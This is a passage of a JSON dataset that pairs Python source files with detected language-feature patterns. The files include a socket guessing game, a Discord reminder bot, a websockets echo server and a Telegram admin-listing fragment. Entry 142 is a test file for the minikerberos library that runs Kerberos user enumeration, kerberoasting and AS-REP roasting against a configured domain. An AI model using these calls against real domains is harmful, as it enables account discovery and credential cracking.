   })",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "from asyncio import sleep"
                    ],
                    [
                        4,
                        4,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        217,
                        220,
                        "async for",
                        "async for x in borg.iter_participants(chat, filter=ChannelParticipantsAdmins):\n            if not x.deleted:\n                if isinstance(x.participant, ChannelParticipantCreator):\n                    mentions += \"\\n \ud83d\udc51 [{}](tg://user?id={}) `{}`\".format(x.first_name, x.id, x.id)"
                    ],
                    [
                        222,
                        227,
                        "async for",
                        "async for x in borg.iter_participants(chat, filter=ChannelParticipantsAdmins):\n            if not x.deleted:\n                if isinstance(x.participant, ChannelParticipantAdmin):\n                    mentions += \"\\n \u269c\ufe0f [{}](tg://user?id={}) `{}`\".format(x.first_name, x.id, x.id)\n            else:\n                mentions += \"\\n `{}`\".format(x.id)"
                    ],
                    [
                        245,
                        249,
                        "async for",
                        "async for user in show.client.iter_participants(show.chat_id):\n                    if not user.deleted:\n                        mentions += f\"\\n[{user.first_name}](tg://user?id={user.id}) `{user.id}`\"\n                    else:\n                        mentions += f\"\\nDeleted Account `{user.id}`\""
                    ],
                    [
                        252,
                        256,
                        "async for",
                        "async for user in show.client.iter_participants(show.chat_id, search=f'{searchq}'):\n                    if not user.deleted:\n                        mentions += f\"\\n[{user.first_name}](tg://user?id={user.id}) `{user.id}`\"\n                    else:\n                        mentions += f\"\\nDeleted Account `{user.id}`\""
                    ]
                ],
                "pep_498v": [
                    [
                        242,
                        242,
                        ".format()"
                    ],
                    [
                        116,
                        116,
                        ".format()"
                    ],
                    [
                        117,
                        117,
                        ".format()"
                    ],
                    [
                        209,
                        209,
                        ".format()"
                    ],
                    [
                        227,
                        227,
                        ".format()"
                    ],
                    [
                        220,
                        220,
                        ".format()"
                    ],
                    [
                        225,
                        225,
                        ".format()"
                    ],
                    [
                        269,
                        269,
                        ".format()"
                    ]
                ],
                "pep_498": [
                    [
                        129,
                        "    caption += f\"ID: <code>{chat_obj_info.id}</code>\\n\""
                    ],
                    [
                        147,
                        "    caption += f\"Data Centre ID: {dc_id}\\n\""
                    ],
                    [
                        131,
                        "        caption += f\"{chat_type} name: {chat_title}\\n\""
                    ],
                    [
                        133,
                        "        caption += f\"Former name: {former_title}\\n\""
                    ],
                    [
                        135,
                        "        caption += f\"{chat_type} type: Public\\n\""
                    ],
                    [
                        136,
                        "        caption += f\"Link: {username}\\n\""
                    ],
                    [
                        138,
                        "        caption += f\"{chat_type} type: Private\\n\""
                    ],
                    [
                        140,
                        "        caption += f\"Creator: {creator_username}\\n\""
                    ],
                    [
                        144,
                        "        caption += f\"Created: <code>{created.date().strftime('%b %d, %Y')} - {created.time()}</code>\\n\""
                    ],
                    [
                        146,
                        "        caption += f\"Created: <code>{chat_obj_info.date.date().strftime('%b %d, %Y')} - {chat_obj_info.date.time()}</code> {warn_emoji}\\n\""
                    ],
                    [
                        150,
                        "        caption += f\"{chat_type} level: <code>{chat_level}</code>\\n\""
                    ],
                    [
                        152,
                        "        caption += f\"Viewable messages: <code>{messages_viewable}</code>\\n\""
                    ],
                    [
                        154,
                        "        caption += f\"Messages sent: <code>{messages_sent}</code>\\n\""
                    ],
                    [
                        158,
                        "        caption += f\"Members: <code>{members}</code>\\n\""
                    ],
                    [
                        160,
                        "        caption += f\"Administrators: <code>{admins}</code>\\n\""
                    ],
                    [
                        162,
                        "        caption += f\"Bots: <code>{bots}</code>\\n\""
                    ],
                    [
                        164,
                        "        caption += f\"Currently online: <code>{members_online}</code>\\n\""
                    ],
                    [
                        166,
                        "        caption += f\"Restricted users: <code>{restrcited_users}</code>\\n\""
                    ],
                    [
                        168,
                        "        caption += f\"Banned users: <code>{banned_users}</code>\\n\""
                    ],
                    [
                        170,
                        "        caption += f\"{chat_type} stickers: <a href=\\\"t.me/addstickers/{chat.full_chat.stickerset.short_name}\\\">{group_stickers}</a>\\n\""
                    ],
                    [
                        173,
                        "        caption += f\"Slow mode: {slowmode}\""
                    ],
                    [
                        179,
                        "        caption += f\"Supergroup: {supergroup}\\n\\n\""
                    ],
                    [
                        181,
                        "        caption += f\"Restricted: {restricted}\\n\""
                    ],
                    [
                        191,
                        "        caption += f\"Verified by Telegram: {verified}\\n\\n\""
                    ],
                    [
                        193,
                        "        caption += f\"Description: \\n<code>{description}</code>\\n\""
                    ],
                    [
                        142,
                        "        caption += f\"Creator: <a href=\\\"tg://user?id={creator_id}\\\">{creator_firstname}</a>\\n\""
                    ],
                    [
                        156,
                        "        caption += f\"Messages sent: <code>{messages_sent_alt}</code> {warn_emoji}\\n\""
                    ],
                    [
                        175,
                        "            caption += f\", <code>{slowmode_time}s</code>\\n\\n\""
                    ],
                    [
                        183,
                        "            caption += f\"> Platform: {chat_obj_info.restriction_reason[0].platform}\\n\""
                    ],
                    [
                        184,
                        "            caption += f\"> Reason: {chat_obj_info.restriction_reason[0].reason}\\n\""
                    ],
                    [
                        185,
                        "            caption += f\"> Text: {chat_obj_info.restriction_reason[0].text}\\n\\n\""
                    ],
                    [
                        247,
                        "                        mentions += f\"\\n[{user.first_name}](tg://user?id={user.id}) `{user.id}`\""
                    ],
                    [
                        249,
                        "                        mentions += f\"\\nDeleted Account `{user.id}`\""
                    ],
                    [
                        252,
                        "                async for user in show.client.iter_participants(show.chat_id, search=f'{searchq}'):"
                    ],
                    [
                        254,
                        "                        mentions += f\"\\n[{user.first_name}](tg://user?id={user.id}) `{user.id}`\""
                    ],
                    [
                        256,
                        "                        mentions += f\"\\nDeleted Account `{user.id}`\""
                    ]
                ]
            }
        },
        "140": {
            "file": "import random\nrandom.seed(1234)\nimport logging\nfrom pprint import pprint\nfrom sys import stdout as STDOUT\nimport atexit\nimport gc\nimport io\nimport os\nimport tempfile\nTEST_DIR = tempfile.TemporaryDirectory()\natexit.register(TEST_DIR.cleanup)\nOLD_CWD = os.getcwd()\natexit.register(lambda: os.chdir(OLD_CWD))\nos.chdir(TEST_DIR.name)\ndef close_open_files():\n    everything = gc.get_objects()\n    for obj in everything:\n        if isinstance(obj, io.IOBase):\n            obj.close()\natexit.register(close_open_files)\ndef example(i): print(f'\\n==== Example {i} ====')\nexample(1)\nclass EOFError(Exception):\n    pass\nclass ConnectionBase:\n    def __init__(self, connection):\n        self.connection = connection\n        self.file = connection.makefile('rb')\n    def send(self, command):\n        line = command + '\\n'\n        data = line.encode()\n        self.connection.send(data)\n    def receive(self):\n        line = self.file.readline()\n        if not line:\n            raise EOFError('Connection closed')\n        return line[:-1].decode()\nexample(2)\nimport random\nWARMER = 'Warmer'\nCOLDER = 'Colder'\nUNSURE = 'Unsure'\nCORRECT = 'Correct'\nclass UnknownCommandError(Exception):\n    pass\nexample(3)\nexample(4)\nexample(5)\nexample(6)\nclass Session(ConnectionBase):\n    def __init__(self, *args):\n        super().__init__(*args)\n        self._clear_state(None, None)\n    def _clear_state(self, lower, upper):\n        self.lower = lower\n        self.upper = upper\n        self.secret = None\n        self.guesses = []\n    def loop(self):\n        while command := self.receive():\n            parts = command.split(' ')\n            if parts[0] == 'PARAMS':\n                self.set_params(parts)\n            elif parts[0] == 'NUMBER':\n                self.send_number()\n            elif parts[0] == 'REPORT':\n                self.receive_report(parts)\n            else:\n                raise UnknownCommandError(command)\n    def set_params(self, parts):\n        assert len(parts) == 3\n        lower = int(parts[1])\n        upper = int(parts[2])\n        self._clear_state(lower, upper)\n    def next_guess(self):\n        if self.secret is not None:\n            return self.secret\n        while True:\n            guess = random.randint(self.lower, self.upper)\n            if guess not in self.guesses:\n                return guess\n    def send_number(self):\n        guess = self.next_guess()\n        self.guesses.append(guess)\n        self.send(format(guess))\n    def receive_report(self, parts):\n        assert len(parts) == 2\n        decision = parts[1]\n        last = self.guesses[-1]\n        if decision == CORRECT:\n            self.secret = last\n        print(f'Server: {last} is {decision}')\nexample(7)\nexample(8)\nexample(9)\nexample(10)\nimport contextlib\nimport math\nclass Client(ConnectionBase):\n    def __init__(self, *args):\n        super().__init__(*args)\n        self._clear_state()\n    def _clear_state(self):\n        self.secret = None\n        self.last_distance = None\n    @contextlib.contextmanager\n    def session(self, lower, upper, secret):\n        print(f'Guess a number between {lower} and {upper}!'\n              f' Shhhhh, it\\'s {secret}.')\n        self.secret = secret\n        self.send(f'PARAMS {lower} {upper}')\n        try:\n            yield\n        finally:\n            self._clear_state()\n            self.send('PARAMS 0 -1')\n    def request_numbers(self, count):\n        for _ in range(count):\n            self.send('NUMBER')\n            data = self.receive()\n            yield int(data)\n            if self.last_distance == 0:\n                return\n    def report_outcome(self, number):\n        new_distance = math.fabs(number - self.secret)\n        decision = UNSURE\n        if new_distance == 0:\n            decision = CORRECT\n        elif self.last_distance is None:\n            pass\n        elif new_distance < self.last_distance:\n            decision = WARMER\n        elif new_distance > self.last_distance:\n            decision = COLDER\n        self.last_distance = new_distance\n        self.send(f'REPORT {decision}')\n        return decision\nexample(11)\nimport socket\nfrom threading import Thread\ndef handle_connection(connection):\n    with connection:\n        session = Session(connection)\n        try:\n            session.loop()\n        except EOFError:\n            pass\ndef run_server(address):\n    with socket.socket() as listener:\n        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        listener.bind(address)\n        listener.listen()\n        while True:\n            connection, _ = listener.accept()\n            thread = Thread(target=handle_connection,\n                            args=(connection,),\n                            daemon=True)\n            thread.start()\nexample(12)\ndef run_client(address):\n    with socket.create_connection(address) as connection:\n        client = Client(connection)\n        with client.session(1, 5, 3):\n            results = [(x, client.report_outcome(x))\n                       for x in client.request_numbers(5)]\n        with client.session(10, 15, 12):\n            for number in client.request_numbers(5):\n                outcome = client.report_outcome(number)\n                results.append((number, outcome))\n    return results\nexample(13)\ndef main():\n    address = ('127.0.0.1', 1234)\n    server_thread = Thread(\n        target=run_server, args=(address,), daemon=True)\n    server_thread.start()\n    results = run_client(address)\n    for number, outcome in results:\n        print(f'Client: {number} is {outcome}')\nmain()\nexample(14)\nclass AsyncConnectionBase:\n    def __init__(self, reader, writer):             \n        self.reader = reader                        \n        self.writer = writer                        \n    async def send(self, command):\n        line = command + '\\n'\n        data = line.encode()\n        self.writer.write(data)                     \n        await self.writer.drain()                   \n    async def receive(self):\n        line = await self.reader.readline()         \n        if not line:\n            raise EOFError('Connection closed')\n        return line[:-1].decode()\nexample(15)\nexample(16)\nexample(17)\nexample(18)\nexample(19)\nclass AsyncSession(AsyncConnectionBase):            \n    def __init__(self, *args):\n        super().__init__(*args)\n        self._clear_values(None, None)\n    def _clear_values(self, lower, upper):\n        self.lower = lower\n        self.upper = upper\n        self.secret = None\n        self.guesses = []\n    async def loop(self):                           \n        while command := await self.receive():      \n            parts = command.split(' ')\n            if parts[0] == 'PARAMS':\n                self.set_params(parts)\n            elif parts[0] == 'NUMBER':\n                await self.send_number()            \n            elif parts[0] == 'REPORT':\n                self.receive_report(parts)\n            else:\n                raise UnknownCommandError(command)\n    def set_params(self, parts):\n        assert len(parts) == 3\n        lower = int(parts[1])\n        upper = int(parts[2])\n        self._clear_values(lower, upper)\n    def next_guess(self):\n        if self.secret is not None:\n            return self.secret\n        while True:\n            guess = random.randint(self.lower, self.upper)\n            if guess not in self.guesses:\n                return guess\n    async def send_number(self):                    \n        guess = self.next_guess()\n        self.guesses.append(guess)\n        await self.send(format(guess))              \n    def receive_report(self, parts):\n        assert len(parts) == 2\n        decision = parts[1]\n        last = self.guesses[-1]\n        if decision == CORRECT:\n            self.secret = last\n        print(f'Server: {last} is {decision}')\nexample(20)\nexample(21)\nexample(22)\nexample(23)\nclass AsyncClient(AsyncConnectionBase):             \n    def __init__(self, *args):\n        super().__init__(*args)\n        self._clear_state()\n    def _clear_state(self):\n        self.secret = None\n        self.last_distance = None\n    @contextlib.asynccontextmanager                 \n    async def session(self, lower, upper, secret):  \n        print(f'Guess a number between {lower} and {upper}!'\n              f' Shhhhh, it\\'s {secret}.')\n        self.secret = secret\n        await self.send(f'PARAMS {lower} {upper}')  \n        try:\n            yield\n        finally:\n            self._clear_state()\n            await self.send('PARAMS 0 -1')          \n    async def request_numbers(self, count):         \n        for _ in range(count):\n            await self.send('NUMBER')               \n            data = await self.receive()             \n            yield int(data)\n            if self.last_distance == 0:\n                return\n    async def report_outcome(self, number):         \n        new_distance = math.fabs(number - self.secret)\n        decision = UNSURE\n        if new_distance == 0:\n            decision = CORRECT\n        elif self.last_distance is None:\n            pass\n        elif new_distance < self.last_distance:\n            decision = WARMER\n        elif new_distance > self.last_distance:\n            decision = COLDER\n        self.last_distance = new_distance\n        await self.send(f'REPORT {decision}')       \n        await asyncio.sleep(0.01)\n        return decision\nexample(24)\nimport asyncio\nasync def handle_async_connection(reader, writer):\n    session = AsyncSession(reader, writer)\n    try:\n        await session.loop()\n    except EOFError:\n        pass\nasync def run_async_server(address):\n    server = await asyncio.start_server(\n        handle_async_connection, *address)\n    async with server:\n        await server.serve_forever()\nexample(25)\nasync def run_async_client(address):\n    await asyncio.sleep(0.1)\n    streams = await asyncio.open_connection(*address)   \n    client = AsyncClient(*streams)                      \n    async with client.session(1, 5, 3):\n        results = [(x, await client.report_outcome(x))\n                   async for x in client.request_numbers(5)]\n    async with client.session(10, 15, 12):\n        async for number in client.request_numbers(5):\n            outcome = await client.report_outcome(number)\n            results.append((number, outcome))\n    _, writer = streams                                 \n    writer.close()                                      \n    await writer.wait_closed()                          \n    return results\nexample(26)\nasync def main_async():\n    address = ('127.0.0.1', 4321)\n    server = run_async_server(address)\n    asyncio.create_task(server)\n    results = await run_async_client(address)\n    for number, outcome in results:\n        print(f'Client: {number} is {outcome}')\nlogging.getLogger().setLevel(logging.ERROR)\nasyncio.run(main_async())\nlogging.getLogger().setLevel(logging.DEBUG)",
            "patterns": {
                "pep_567": [
                    [
                        290,
                        290,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_572": [
                    [
                        61,
                        "        while command := self.receive():"
                    ],
                    [
                        212,
                        "        while command := await self.receive():      "
                    ]
                ],
                "pep_530": [
                    [
                        308,
                        "results = [(x, await client.report_outcome(x))"
                    ]
                ],
                "pep_525": [
                    [
                        257,
                        266,
                        "async generator",
                        "async def session(self, lower, upper, secret):  \n        print(f'Guess a number between {lower} and {upper}!'\n              f' Shhhhh, it\\'s {secret}.')\n        self.secret = secret\n        await self.send(f'PARAMS {lower} {upper}')  \n        try:\n            yield\n        finally:\n            self._clear_state()\n            await self.send('PARAMS 0 -1')"
                    ],
                    [
                        267,
                        273,
                        "async generator",
                        "async def request_numbers(self, count):         \n        for _ in range(count):\n            await self.send('NUMBER')               \n            data = await self.receive()             \n            yield int(data)\n            if self.last_distance == 0:\n                return"
                    ],
                    [
                        311,
                        313,
                        "async for",
                        "async for number in client.request_numbers(5):\n            outcome = await client.report_outcome(number)\n            results.append((number, outcome))"
                    ]
                ],
                "pep_498": [
                    [
                        22,
                        "def example(i): print(f'\\n==== Example {i} ====')"
                    ],
                    [
                        93,
                        "        print(f'Server: {last} is {decision}')"
                    ],
                    [
                        109,
                        "        print(f'Guess a number between {lower} and {upper}!'"
                    ],
                    [
                        112,
                        "        self.send(f'PARAMS {lower} {upper}')"
                    ],
                    [
                        137,
                        "        self.send(f'REPORT {decision}')"
                    ],
                    [
                        180,
                        "        print(f'Client: {number} is {outcome}')"
                    ],
                    [
                        244,
                        "        print(f'Server: {last} is {decision}')"
                    ],
                    [
                        258,
                        "        print(f'Guess a number between {lower} and {upper}!'"
                    ],
                    [
                        325,
                        "        print(f'Client: {number} is {outcome}')"
                    ],
                    [
                        261,
                        "        await self.send(f'PARAMS {lower} {upper}')  "
                    ],
                    [
                        286,
                        "        await self.send(f'REPORT {decision}')       "
                    ]
                ]
            }
        },
        "141": {
            "file": "import asyncio\nimport textwrap\nfrom dataclasses import dataclass\nfrom datetime import datetime\nfrom typing import NamedTuple\nimport discord\nfrom discord.ext import commands\nfrom discord.ext.menus.views import ViewMenuPages\nfrom helpers import time\nfrom helpers.pagination import AsyncEmbedFieldsPageSource\nfrom helpers.utils import FakeUser\n@dataclass\nclass Reminder:\n    user: discord.Member\n    event: str\n    guild_id: int\n    channel_id: int\n    message_id: int\n    created_at: datetime\n    expires_at: datetime\n    resolved: bool = False\n    _id: int = None\n    @classmethod\n    def build_from_mongo(cls, bot, x):\n        guild = bot.get_guild(x[\"guild_id\"])\n        user = guild.get_member(x[\"user_id\"]) or FakeUser(x[\"user_id\"])\n        return cls(\n            _id=x[\"_id\"],\n            user=user,\n            event=x[\"event\"],\n            guild_id=x[\"guild_id\"],\n            channel_id=x[\"channel_id\"],\n            message_id=x[\"message_id\"],\n            created_at=x[\"created_at\"],\n            expires_at=x[\"expires_at\"],\n        )\n    def to_dict(self):\n        return {\n            \"user_id\": self.user.id,\n            \"event\": self.event,\n            \"guild_id\": self.guild_id,\n            \"channel_id\": self.channel_id,\n            \"message_id\": self.message_id,\n            \"created_at\": self.created_at,\n            \"expires_at\": self.expires_at,\n            \"resolved\": self.resolved,\n        }\n    def __eq__(self, other):\n        if self._id == other._id:\n            return\n    @property\n    def duration(self):\n        return self.expires_at - self.created_at\nclass DispatchedReminder(NamedTuple):\n    reminder: Reminder\n    task: asyncio.Task\nclass Reminders(commands.Cog):\n    def __init__(self, bot):\n        self.bot = bot\n        self._current = None\n        self.bot.loop.create_task(self.update_current())\n    @commands.group(\n        invoke_without_command=True, aliases=(\"remindme\", \"reminder\"), usage=\"<when> [event]\"\n    )\n    @commands.guild_only()\n    async def remind(\n        self, ctx, *, when: time.UserFriendlyTime(commands.clean_content, default=\"\\u2026\")\n    ):\n        reminder = Reminder(\n            user=ctx.author,\n            event=when.arg,\n            guild_id=ctx.guild.id,\n            channel_id=ctx.channel.id,\n            message_id=ctx.message.id,\n            created_at=ctx.message.created_at,\n            expires_at=when.dt,\n        )\n        id = await self.bot.mongo.reserve_id(\"reminder\")\n        await self.bot.mongo.db.reminder.insert_one({\"_id\": id, **reminder.to_dict()})\n        reminder._id = id\n        self.bot.loop.create_task(self.update_current(reminder))\n        await ctx.send(\n            f\"Alright, I'll remind you in **{time.human_timedelta(reminder.duration)}**: {when.arg}\"\n        )\n    @remind.command()\n    @commands.guild_only()\n    async def list(self, ctx):\n        query = {\"resolved\": False, \"user_id\": ctx.author.id}\n        count = await self.bot.mongo.db.reminder.count_documents(query)\n        async def get_reminders():\n            async for x in self.bot.mongo.db.reminder.find(query).sort(\"expires_at\", 1):\n                yield Reminder.build_from_mongo(self.bot, x)\n        def format_item(i, x):\n            name = f\"{x._id}. {discord.utils.format_dt(x.expires_at, 'R')}\"\n            return {\"name\": name, \"value\": textwrap.shorten(x.event, 512), \"inline\": False}\n        pages = ViewMenuPages(\n            source=AsyncEmbedFieldsPageSource(\n                get_reminders(),\n                title=\"Reminders\",\n                format_item=format_item,\n                count=count,\n            )\n        )\n        try:\n            await pages.start(ctx)\n        except IndexError:\n            await ctx.send(\"No reminders found.\")\n    @remind.command(aliases=(\"del\",))\n    @commands.guild_only()\n    async def delete(self, ctx, ids: commands.Greedy[int]):\n        result = await self.bot.mongo.db.reminder.delete_many(\n            {\n                \"_id\": {\"$in\": ids},\n                \"guild_id\": ctx.guild.id,\n                \"resolved\": False,\n                \"user_id\": ctx.author.id,\n            }\n        )\n        word = \"entry\" if result.deleted_count == 1 else \"entries\"\n        await ctx.send(f\"Successfully deleted {result.deleted_count} {word}.\")\n        self.clear_current()\n        self.bot.loop.create_task(self.update_current())\n    async def get_next_reminder(self):\n        return Reminder.build_from_mongo(\n            self.bot,\n            await self.bot.mongo.db.reminder.find_one(\n                {\"resolved\": False}, sort=((\"expires_at\", 1),)\n            ),\n        )\n    def clear_current(self):\n        self._current.task.cancel()\n        self._current = None\n    async def update_current(self, reminder=None):\n        if reminder is None:\n            reminder = await self.get_next_reminder()\n            if reminder is None:\n                return\n        if self._current is not None and not self._current.task.done():\n            if reminder.expires_at > self._current.reminder.expires_at:\n                return\n            self.clear_current()\n        self._current = DispatchedReminder(\n            reminder=reminder,\n            task=self.bot.loop.create_task(self.dispatch_reminder(reminder)),\n        )\n    async def dispatch_reminder(self, reminder):\n        try:\n            await discord.utils.sleep_until(reminder.expires_at)\n        except asyncio.CancelledError:\n            return\n        await self.bot.mongo.db.reminder.update_one(\n            {\"_id\": reminder._id}, {\"$set\": {\"resolved\": True}}\n        )\n        guild = self.bot.get_guild(reminder.guild_id)\n        channel = guild.get_channel(reminder.channel_id)\n        text = (\n            f\"Reminder from {discord.utils.format_dt(reminder.created_at, 'R')}: {reminder.event}\"\n        )\n        try:\n            message = await channel.fetch_message(reminder.message_id)\n        except (discord.NotFound, discord.Forbidden, discord.HTTPException):\n            text = f\"{reminder.user.mention} {text}\"\n            message = None\n        await channel.send(\n            f\"Reminder from {discord.utils.format_dt(reminder.created_at, 'R')}: {reminder.event}\",\n            reference=message,\n        )\n        self.bot.loop.create_task(self.update_current())\ndef setup(bot):\n    bot.add_cog(Reminders(bot))",
            "patterns": {
                "pep_526": [
                    [
                        14,
                        "user: discord.Member"
                    ],
                    [
                        15,
                        "event: str"
                    ],
                    [
                        16,
                        "guild_id: int"
                    ],
                    [
                        17,
                        "channel_id: int"
                    ],
                    [
                        18,
                        "message_id: int"
                    ],
                    [
                        19,
                        "created_at: datetime"
                    ],
                    [
                        20,
                        "expires_at: datetime"
                    ],
                    [
                        21,
                        "resolved: bool = False"
                    ],
                    [
                        22,
                        "_id: int = None"
                    ],
                    [
                        55,
                        "reminder: Reminder"
                    ],
                    [
                        56,
                        "task: asyncio.Task"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_557": [
                    [
                        3,
                        3,
                        "dataclasses import",
                        "from dataclasses import dataclass"
                    ],
                    [
                        13,
                        53,
                        "dataclass definition",
                        "class Reminder:\n    user: discord.Member\n    event: str\n    guild_id: int\n    channel_id: int\n    message_id: int\n    created_at: datetime\n    expires_at: datetime\n    resolved: bool = False\n    _id: int = None\n    @classmethod\n    def build_from_mongo(cls, bot, x):\n        guild = bot.get_guild(x[\"guild_id\"])\n        user = guild.get_member(x[\"user_id\"]) or FakeUser(x[\"user_id\"])\n        return cls(\n            _id=x[\"_id\"],\n            user=user,\n            event=x[\"event\"],\n            guild_id=x[\"guild_id\"],\n            channel_id=x[\"channel_id\"],\n            message_id=x[\"message_id\"],\n            created_at=x[\"created_at\"],\n            expires_at=x[\"expires_at\"],\n        )\n    def to_dict(self):\n        return {\n            \"user_id\": self.user.id,\n            \"event\": self.event,\n            \"guild_id\": self.guild_id,\n            \"channel_id\": self.channel_id,\n            \"message_id\": self.message_id,\n            \"created_at\": self.created_at,\n            \"expires_at\": self.expires_at,\n            \"resolved\": self.resolved,\n        }\n    def __eq__(self, other):\n        if self._id == other._id:\n            return\n    @property\n    def duration(self):\n        return self.expires_at - self.created_at"
                    ]
                ],
                "pep_525": [
                    [
                        87,
                        107,
                        "async generator",
                        "async def list(self, ctx):\n        query = {\"resolved\": False, \"user_id\": ctx.author.id}\n        count = await self.bot.mongo.db.reminder.count_documents(query)\n        async def get_reminders():\n            async for x in self.bot.mongo.db.reminder.find(query).sort(\"expires_at\", 1):\n                yield Reminder.build_from_mongo(self.bot, x)\n        def format_item(i, x):\n            name = f\"{x._id}. {discord.utils.format_dt(x.expires_at, 'R')}\"\n            return {\"name\": name, \"value\": textwrap.shorten(x.event, 512), \"inline\": False}\n        pages = ViewMenuPages(\n            source=AsyncEmbedFieldsPageSource(\n                get_reminders(),\n                title=\"Reminders\",\n                format_item=format_item,\n                count=count,\n            )\n        )\n        try:\n            await pages.start(ctx)\n        except IndexError:\n            await ctx.send(\"No reminders found.\")"
                    ],
                    [
                        90,
                        92,
                        "async generator",
                        "async def get_reminders():\n            async for x in self.bot.mongo.db.reminder.find(query).sort(\"expires_at\", 1):\n                yield Reminder.build_from_mongo(self.bot, x)"
                    ],
                    [
                        91,
                        92,
                        "async for",
                        "async for x in self.bot.mongo.db.reminder.find(query).sort(\"expires_at\", 1):\n                yield Reminder.build_from_mongo(self.bot, x)"
                    ]
                ],
                "pep_498": [
                    [
                        157,
                        "            f\"Reminder from {discord.utils.format_dt(reminder.created_at, 'R')}: {reminder.event}\""
                    ],
                    [
                        94,
                        "            name = f\"{x._id}. {discord.utils.format_dt(x.expires_at, 'R')}\""
                    ],
                    [
                        83,
                        "            f\"Alright, I'll remind you in **{time.human_timedelta(reminder.duration)}**: {when.arg}\""
                    ],
                    [
                        120,
                        "        await ctx.send(f\"Successfully deleted {result.deleted_count} {word}.\")"
                    ],
                    [
                        162,
                        "            text = f\"{reminder.user.mention} {text}\""
                    ],
                    [
                        165,
                        "            f\"Reminder from {discord.utils.format_dt(reminder.created_at, 'R')}: {reminder.event}\","
                    ]
                ]
            }
        },
        "142": {
            "file": "from minikerberos.common.factory import KerberosClientFactory\nfrom minikerberos.common.spn import KerberosSPN\nfrom minikerberos.common.creds import KerberosCredential\nfrom minikerberos.common.kirbi import Kirbi\nfrom minikerberos.security import krb5userenum, asreproast, kerberoast\nfrom minikerberos.common.target import KerberosTarget\nimport asyncio\nimport pytest \nfrom .config import *\n@pytest.mark.asyncio\nasync def test_userenum_valid():\n\ttarget = KerberosTarget(KERBEROS_SERVER)\n\tfound = 0\n\tasync for username, res, response, err in krb5userenum(target, KERBEROS_USERNAMES_VALID, KERBEROS_DOMAIN):\n\t\tassert err is None\n\t\tassert res is True\n\t\tfound += 1\n\tassert found == len(KERBEROS_USERNAMES_VALID)\n@pytest.mark.asyncio\nasync def test_userenum_invalid():\n\ttarget = KerberosTarget(KERBEROS_SERVER)\n\tfound = 0\n\tasync for username, res, response, err in krb5userenum(target, KERBEROS_USERNAMES_NONEXISTENT, KERBEROS_DOMAIN):\n\t\tassert err is None\n\t\tassert res is False\n\t\tfound += 1\n\tassert found == len(KERBEROS_USERNAMES_NONEXISTENT)\n@pytest.mark.asyncio\nasync def test_kerberoast_linux():\n\tcu = KerberosClientFactory.from_url(KERBEROS_CONN_URL_PW)\n\tasync for username, res, err in kerberoast(cu, KERBEROS_USERNAMES_KERBEROAST, KERBEROS_DOMAIN):\n\t\tassert res is not None\n\t\tassert err is None\n\t\tassert username is not None\n@pytest.mark.asyncio\nasync def test_kerberoast_linux_override():\n\tcu = KerberosClientFactory.from_url(KERBEROS_CONN_URL_PW)\n\tasync for username, res, err in kerberoast(cu, KERBEROS_USERNAMES_KERBEROAST, KERBEROS_DOMAIN, override_etype=23):\n\t\tassert res is not None\n\t\tassert err is None\n\t\tassert username is not None\n@pytest.mark.asyncio\nasync def test_apreproast_valid():\n\ttarget = KerberosTarget(KERBEROS_SERVER)\n\tasync for username, res, err in asreproast(target, KERBEROS_USERNAMES_ASREP, KERBEROS_DOMAIN):\n\t\tassert err is None\n\t\tassert res is not None\n@pytest.mark.asyncio\nasync def test_apreproast_invalid():\n\ttarget = KerberosTarget(KERBEROS_SERVER)\n\tasync for username, res, err in asreproast(target, KERBEROS_USERNAMES_KERBEROAST, KERBEROS_DOMAIN):\n\t\tassert err is not None\nif __name__ == '__main__':\n\tasyncio.run(test_userenum_invalid())",
            "patterns": {
                "pep_567": [
                    [
                        7,
                        7,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        14,
                        17,
                        "async for",
                        "async for username, res, response, err in krb5userenum(target, KERBEROS_USERNAMES_VALID, KERBEROS_DOMAIN):\n\t\tassert err is None\n\t\tassert res is True\n\t\tfound += 1"
                    ],
                    [
                        23,
                        26,
                        "async for",
                        "async for username, res, response, err in krb5userenum(target, KERBEROS_USERNAMES_NONEXISTENT, KERBEROS_DOMAIN):\n\t\tassert err is None\n\t\tassert res is False\n\t\tfound += 1"
                    ],
                    [
                        31,
                        34,
                        "async for",
                        "async for username, res, err in kerberoast(cu, KERBEROS_USERNAMES_KERBEROAST, KERBEROS_DOMAIN):\n\t\tassert res is not None\n\t\tassert err is None\n\t\tassert username is not None"
                    ],
                    [
                        38,
                        41,
                        "async for",
                        "async for username, res, err in kerberoast(cu, KERBEROS_USERNAMES_KERBEROAST, KERBEROS_DOMAIN, override_etype=23):\n\t\tassert res is not None\n\t\tassert err is None\n\t\tassert username is not None"
                    ],
                    [
                        45,
                        47,
                        "async for",
                        "async for username, res, err in asreproast(target, KERBEROS_USERNAMES_ASREP, KERBEROS_DOMAIN):\n\t\tassert err is None\n\t\tassert res is not None"
                    ],
                    [
                        51,
                        52,
                        "async for",
                        "async for username, res, err in asreproast(target, KERBEROS_USERNAMES_KERBEROAST, KERBEROS_DOMAIN):\n\t\tassert err is not None"
                    ]
                ]
            }
        },
        "143": {
            "file": "import asyncio\nimport websockets\nasync def echo(websocket):\n    async for message in websocket:\n        await websocket.send(message)\nasync def main():\n    async with websockets.serve(echo, \"localhost\", 8765):\n        await asyncio.Future()  \nimport asyncio\nimport datetime\nimport random\nimport websockets\nasync def show_time(websocket):\n    while True:\n        message = datetime.datetime.utcnow().isoformat() + \"Z\"\n        await websocket.send(message)\n        await asyncio.sleep(random.random() * 2 + 1)\nasync def main():\n    async with websockets.serve(show_time, \"localhost\", 5678):\n        await asyncio.Future()  \nif __name__ == \"__main__\":\n    asyncio.run(main())",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ],
                    [
                        9,
                        9,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        4,
                        5,
                        "async for",
                        "async for message in websocket:\n        await websocket.send(message)"
                    ]
                ]
            }
        },
        "144": {
